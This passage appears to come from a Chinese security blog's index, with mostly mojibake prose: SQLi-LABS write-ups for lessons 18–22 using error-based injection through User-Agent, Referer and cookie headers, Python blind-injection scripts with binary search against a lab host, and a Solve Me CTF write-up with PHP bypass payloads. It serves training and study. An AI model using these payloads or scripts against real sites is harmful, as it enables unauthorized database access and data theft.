class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å›falseã€‚</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>ä¸€è¿›å»å°±æ˜¾ç¤ºipï¼Œå¯èƒ½æ˜¯httpå¤´æ³¨å…¥<br>æŸ¥çœ‹æºä»£ç æˆ‘ä»¬æ˜¯è¦ç™»å½•è¿›å»åæ‰èƒ½æ³¨å…¥ï¼Œåˆ©ç”¨çš„æ˜¯insertçš„é‚£ä¸€éƒ¨åˆ†è¯­å¥<br>å…ˆåœ¨user-agenté‚£é‡Œè¾“å…¥1â€™ ä¼šå‡ºç°æŠ¥é”™<br><code>MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, &#39;admin&#39;)&#39;</code><br>å†å°è¯•ä¸€ä¸‹<code>1&#39; and &#39;1&#39;=&#39;1</code><br>å‡ºç°å›æ˜¾æ²¡æœ‰æŠ¥é”™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: 1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>ç°åœ¨å°±å¯ä»¥ç›´æ¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>ä»ä¸Šä¸€é¢˜å¼€å§‹è¿™é‡Œçš„æ¯ä¸€é“é¢˜ç›®éƒ½éœ€è¦ç™»é™†ä¸€ä¸‹æ‰è¡Œ<br>è¿™ä¸€æ¬¡å›æ˜¾çš„æ˜¯åœ¨refererä¸Šé¢<br>å°è¯•åœ¨refererä¸Šé¢æµ‹è¯•1â€™ and â€˜1â€™=â€™1<br>ç›´æ¥å›æ˜¾<br>è¯´æ˜è¿™ä¸€æ¬¡çš„æ³¨å…¥ç‚¹æ˜¯åœ¨refererä¸Šé¢<br>ç„¶ååƒåˆšæ‰ä¸€æ ·ç›´æ¥æŠ¥é”™å°±å¥½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&apos; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>ç™»é™†åå‘ç°å¾ˆæ˜æ˜¾çš„cookieå­—æ ·çŒœæµ‹åº”è¯¥æ˜¯cookieæ³¨å…¥<br>é€€å‡ºåå°è¯•åœ¨httpå¤´å¤„å°è¯•cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;;</span><br></pre></td></tr></table></figure><p>å‡ºç°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯å•å¼•å·é—­åˆ<br>å†å°è¯•<br><code>uname=admin&#39; or &#39;1&#39;=&#39;1</code>æˆåŠŸå›æ˜¾<br>ä¸‹é¢å°±å¾ˆå¥½åŠäº†ï¼Œç›´æ¥æŠ¥é”™æ³¨å…¥å°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>è¿™ä¸€é¢˜æ˜æ˜¾å‘ç°unameé‚£ä¸€éƒ¨åˆ†ç»è¿‡äº†base64åŠ å¯†<br>æˆ‘ä»¬åŠ ä¸Šå•å¼•å·å†å°è¯•åŠ å¯†å‘é€çœ‹ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4n</span><br></pre></td></tr></table></figure><p>å‡ºç°è·Ÿä¸Šä¸€é¢˜ä¸€æ ·çš„æŠ¥é”™ï¼Œçœ‹æ¥æ˜¯ä¸€æ ·çš„äº†ï¼Œå°±æ˜¯åŠ ä¸Šbase64åŠ å¯†è€Œå·²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šé¢è¿™ä¸€ä¸²base64åŠ å¯†å°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>ç›´æ¥å›æ˜¾ä½ æƒ³è¦çš„ä¸œè¥¿ï¼ŒæˆåŠŸ</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>è¿™ä¸€é¢˜å°±æ˜¯ä¸Šä¸€é¢˜çš„å¥—è·¯ï¼Œåªæ˜¯æŠŠå•å¼•å·ç¬”æ¢æˆäº†åŒå¼•å·è€Œå·²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4i</span><br></pre></td></tr></table></figure><p>å‡ºç°æŠ¥é”™<br>ç›´æ¥<code>admin&quot; or &quot;1&quot;=&quot;1</code> é—­åˆä¸€ä¸‹åŠ å¯†æäº¤å°±å¥½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4iIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>å›æ˜¾æ­£å¸¸<br>å¼€å§‹æŠ¥é”™æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p>åŠ å¯†å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>å›æ˜¾æ•°æ®åº“æˆåŠŸ</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>SQLi-LABS Page-1(Basic Challenges)çš„22é¢˜å°±å·²ç»å…¨éƒ¨å®Œçˆ†äº†<br>è¿™é‡Œé¢çš„22é“é¢˜ç›®éƒ½æ˜¯æŠŠä¸€äº›å¸¸è§çš„æ³¨å…¥ç±»å‹ç»™è¿‡äº†ä¸€éï¼Œæˆ‘è§‰å¾—å¤§æ¦‚éƒ½æ˜¯å››ç§ç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è”åˆæŸ¥è¯¢æ³¨å…¥</span><br><span class="line">æŠ¥é”™æ³¨å…¥</span><br><span class="line">boolç›²æ³¨</span><br><span class="line">æ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><p>åé¢çš„ä»18å…³å¼€å§‹å°±å¼€å§‹æ˜¯httpå¤´çš„æ³¨å…¥ï¼Œä½†æ— è®ºæ˜¯ä»€ä¹ˆæ³¨å…¥ï¼Œå…³é”®æ˜¯è¦æ‰¾åˆ°æ³¨å…¥ç‚¹åœ¨å“ªé‡Œï¼Œç„¶åç”¨åˆé€‚çš„æ–¹æ³•å»é—­åˆç›¸å…³è¯­å¥ï¼Œç„¶åå†ç”¨æ­£å¸¸çš„è¯­å¥å»æŸ¥è¯¢ä½ æ‰€éœ€è¦çš„ä¿¡æ¯å°±å¥½äº†</p>]]></content>
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>äºŒåˆ†æŸ¥æ‰¾åœ¨sqlç›²æ³¨é‡Œé¢çš„åº”ç”¨</title>
      <link href="/bin-search-sql.html"/>
      <url>/bin-search-sql.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨é‡æ–°å¤ä¹ SQLæ³¨å…¥ç”¨äº†sqllabsè¿™ä¸ªé¶åœºï¼Œå‘ç°åœ¨åšç›²æ³¨çš„æ—¶å€™è‡ªå·±å†™çš„è„šæœ¬ï¼Œå°±ä¸€ç›´è‡ªå¢å»ç›²æ³¨çš„è¯æ—¶é—´èŠ±è´¹å¤ªå¤§ï¼Œæ‰€ä»¥å°±åœ¨çœ‹äº†çœ‹äºŒåˆ†æŸ¥æ‰¾åœ¨è¿™ä¸€æ–¹é¢çš„åº”ç”¨<br>ç¡®å®å¿«äº†ä¸å°‘ï¼Œå¾ˆä¹…æ²¡æœ‰å†™è¿‡å°è„šæœ¬å°±æ‰‹æœ‰ç‚¹ç”Ÿç–äº†ï¼Œèµ¶ç´§è®°å½•ä¸€ä¸‹<a id="more"></a></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>äºŒåˆ†æŸ¥æ‰¾åˆç§°æŠ˜åŠæŸ¥æ‰¾ï¼Œä¼˜ç‚¹æ˜¯æ¯”è¾ƒæ¬¡æ•°å°‘ï¼ŒæŸ¥æ‰¾é€Ÿåº¦å¿«ï¼Œå¹³å‡æ€§èƒ½å¥½ï¼›å…¶ç¼ºç‚¹æ˜¯è¦æ±‚å¾…æŸ¥è¡¨ä¸ºæœ‰åºè¡¨ï¼Œä¸”æ’å…¥åˆ é™¤å›°éš¾ã€‚å› æ­¤ï¼ŒæŠ˜åŠæŸ¥æ‰¾æ–¹æ³•é€‚ç”¨äºä¸ç»å¸¸å˜åŠ¨è€ŒæŸ¥æ‰¾é¢‘ç¹çš„æœ‰åºåˆ—è¡¨ã€‚é¦–å…ˆï¼Œå‡è®¾è¡¨ä¸­å…ƒç´ æ˜¯æŒ‰å‡åºæ’åˆ—ï¼Œå°†è¡¨ä¸­é—´ä½ç½®è®°å½•çš„å…³é”®å­—ä¸æŸ¥æ‰¾å…³é”®å­—æ¯”è¾ƒï¼Œå¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œåˆ™æŸ¥æ‰¾æˆåŠŸï¼›å¦åˆ™åˆ©ç”¨ä¸­é—´ä½ç½®è®°å½•å°†è¡¨åˆ†æˆå‰ã€åä¸¤ä¸ªå­è¡¨ï¼Œå¦‚æœä¸­é—´ä½ç½®è®°å½•çš„å…³é”®å­—å¤§äºæŸ¥æ‰¾å…³é”®å­—ï¼Œåˆ™è¿›ä¸€æ­¥æŸ¥æ‰¾å‰ä¸€å­è¡¨ï¼Œå¦åˆ™è¿›ä¸€æ­¥æŸ¥æ‰¾åä¸€å­è¡¨ã€‚é‡å¤ä»¥ä¸Šè¿‡ç¨‹ï¼Œç›´åˆ°æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„è®°å½•ï¼Œä½¿æŸ¥æ‰¾æˆåŠŸï¼Œæˆ–ç›´åˆ°å­è¡¨ä¸å­˜åœ¨ä¸ºæ­¢ï¼Œæ­¤æ—¶æŸ¥æ‰¾ä¸æˆåŠŸã€‚</p><h3 id="æ—¶é—´å¤æ‚åº¦"><a href="#æ—¶é—´å¤æ‚åº¦" class="headerlink" title="æ—¶é—´å¤æ‚åº¦"></a>æ—¶é—´å¤æ‚åº¦</h3><p> æœ€ä¼˜æ—¶é—´å¤æ‚åº¦ï¼šO(1)<br> æœ€åæ—¶é—´å¤æ‚åº¦ï¼šO(logn)</p><p><img src="https://s1.ax1x.com/2018/08/27/Pqwqeg.png" alt="Pqwqeg.png"></p><p>å¯ä»¥è‡ªè¡Œå¯¹æ¯”ä¸€ä¸‹ä¸¤ç»„ä»£ç çš„ä¸åŒ<br>è¿™æ˜¯è‡ªå¢çš„å†™æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#æ³¨æ„ä¸€ä¸‹è¿™é‡Œä½¿ç”¨=å»ä½œä¸ºåˆ¤æ–­æ¡ä»¶</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä½¿ç”¨äºŒåˆ†æ³•å»æœç´¢ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨éé€’å½’çš„åŠæ³•å»å®ç°äºŒåˆ†æŸ¥æ‰¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#æ³¨æ„ä¸€ä¸‹è¿™é‡Œä½¿ç”¨&gt;å»ä½œä¸ºåˆ¤æ–­æ¡ä»¶</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):  <span class="comment">#è¿™ä¸ªåœ°æ–¹å¯èƒ½ä¼šæœ‰äº›é—®é¢˜ï¼Œæ•°æ®åº“é•¿åº¦æœªçŸ¥çš„æ—¶å€™è¿‡é•¿ä¼šå‡ºç°é‡å¤å­—æ¯åˆ°æ—¶å€™è‡ªè¡Œåˆ é™¤å³å¯</span></span><br><span class="line">min = <span class="number">65</span></span><br><span class="line">max = <span class="number">122</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min) &gt; <span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">payload = url.format(_=i,__ = mid)</span><br><span class="line">ans = requests.get(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line"></span><br><span class="line">database += chr(max)</span><br><span class="line"><span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/27/Pq0imF.png" alt="Pq0imF.png"></p>]]></content>
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒåˆ†æŸ¥æ‰¾ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Solve Meè§£é¢˜è®°å½•</title>
      <link href="/Solve-Me-wp.html"/>
      <url>/Solve-Me-wp.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰ä¸€é˜µå­å…³æ³¨ç‚¹åœ¨å®æˆ˜ä¸Šï¼Œç°åœ¨åˆå›å½’CTFå­¦ä¹ å¥—è·¯äº†ï¼Œè¿™ä¸ªç½‘ç«™<a href="http://solveme.peng.kr" target="_blank" rel="noopener">http://solveme.peng.kr</a> æœ¬æ¥åšäº†ä¸€åŠçš„é¢˜ç›®ï¼Œä»Šå¤©ç»ˆäºæŠŠä»–è¡¥å®Œäº†ï¼Œå­¦åˆ°äº†ç‚’é¸¡å¤šçš„ä¸œè¥¿å•Š<a id="more"></a>~</p><p>##æ­£æ–‡</p><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>ç»™å‡ºæ¥ä¸€ä¸ªå¯†æ–‡å’Œä¸€æ®µä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™é¢˜ç›´æ¥åè¿‡æ¥å†™ä»£ç å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($s))));</span><br></pre></td></tr></table></figure><h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'å°Šì°¢æ‚¼åš´éš†'</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å¯ä»¥çŸ¥é“æˆ‘ä»¬è¦ä¼ è¿›getå‚æ•°ï¼Œä½†æ˜¯<code>===</code>åé¢çš„å†…å®¹ä¸åœ¨å¯è§çš„ASCIIç èŒƒå›´å†…äºæ˜¯æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹<br>æ‰¾åˆ°å¯¹åº”å­—ç¬¦ä¸²çš„ASCIIç ï¼Œæˆ‘ä»¬çŸ¥é“å•å¼•å·urlç¼–ç ä¸º%27,ä¸¤ä¸ª27ä¹‹é—´çš„å°±æ˜¯é‚£ä¸²å­—ç¬¦ä¸²çš„ASCIIç ï¼Œ<br>ç›´æ¥æ„é€ <code>payloadï¼š?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code>,å¾—åˆ°flag</p><h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ä¸ªé¢˜ç›®æˆ‘ä»¬è¿ç”¨äº†<code>intçš„å¼ºåˆ¶è½¬æ¢</code>å’Œ<code>ç§‘å­¦è®¡æ•°æ³•</code><br>è¿™ä¸ªé¢˜ç›®å…ˆä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡å‰é¢çš„ä¸¤ä¸ª<code>time</code>ä»¥åŠ<code>is_numeric</code>ï¼Œæœ€åé€šè¿‡intçš„é˜¶æ®µè·å–åˆ°flagï¼Œå› ä¸º<code>60 * 60 * 24 * 30 * 2=5.184*10^6</code><br>ç°åœ¨çš„<code>payloadï¼š?time=5.185e6</code>,sleepå¤§çº¦5ç§’åå‡ºç°flag<br>ä¸ºä»€ä¹ˆå‡ºç°è¿™æ ·çš„æ•ˆæœæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $time = <span class="string">'5.185e6'</span>;</span><br><span class="line"> $num1 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>;</span><br><span class="line"> $num2 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>;</span><br><span class="line"> var_dump(!is_numeric($time));</span><br><span class="line"> var_dump($time&gt;$num1);</span><br><span class="line"> var_dump($time&lt;$num2);</span><br><span class="line"> var_dump((int)$time);</span><br><span class="line"></span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">int(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><p>ä¸€å¼€å§‹ä¸Šæ‰‹è¿™ä¸€ä¸ªé¢˜ç›®ï¼Œå‘ç°ä»€ä¹ˆå¤´ç»ªä¹Ÿæ²¡æœ‰ï¼Œå› ä¸ºä»–çš„é‚£äº›å‚æ•°æˆ‘ä¸€ä¸ªéƒ½ä¸çŸ¥é“ï¼Œå‘ç°urlæœ‰ç‚¹å¥‡æ€ªåæ¥å°±å°è¯•ç€ç›´æ¥å»è®¿é—®<code>index.php</code>ï¼Œç½‘é¡µé¡¿äº†ä¸€ä¸‹åˆå›åˆ°äº†login.phpï¼Œæ€€ç–‘å­˜åœ¨<code>302è·³è½¬</code>ï¼Œäºæ˜¯æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œæœç„¶é‡å®šå‘åˆ°<code>login.php</code><br>ä½†åŒæ—¶æˆ‘ä»¬ä¹Ÿå¾—åˆ°flag</p><p>è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•ï¼Œç›´æ¥curlä¸€ä¸‹çœ‹æƒ…å†µ<br><a href="https://imgchr.com/i/P21ZSH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P21ZSH.md.png" alt="P21ZSH.md.png"></a></p><h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL 